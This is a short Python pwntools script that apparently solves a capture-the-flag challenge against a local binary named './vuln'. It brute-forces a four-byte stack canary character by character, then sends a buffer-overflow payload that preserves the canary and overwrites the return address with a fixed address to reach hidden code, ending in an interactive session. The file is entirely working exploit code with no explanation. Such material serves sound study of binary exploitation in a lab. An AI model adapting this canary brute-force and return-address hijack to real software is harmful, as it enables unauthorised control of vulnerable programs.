#! /usr/bin/python3


from pwn import *
from string import printable
import time



canary_length = 4
buffer_length = 64

i = buffer_length + 1

canary = ""

# Brute Force the Canary

while i <= buffer_length + canary_length :
    for c in printable :
        p = process('./vuln')

        p.sendlineafter(b'How Many Bytes will You Write Into the Buffer?', str(i).encode())
        p.sendlineafter(b'Input> ', ('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa' + canary + c).encode())

        if p.recvline().decode() == "Ok... Now Where's the Flag?\n" :
            canary += c
            print(f"canary to go : {canary}")
            i += 1
            # To check if the canary is constructed correctly
            # time.sleep(5)
            break

        p.close()

p = process('./vuln')

p.sendlineafter(b'How Many Bytes will You Write Into the Buffer?', str(88).encode())
payload = (b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa' + canary.encode() + b'raaasaaataaauaaa\x36\x93\x04\x08')
p.sendlineafter(b'Input> ',payload)
p.interactive()




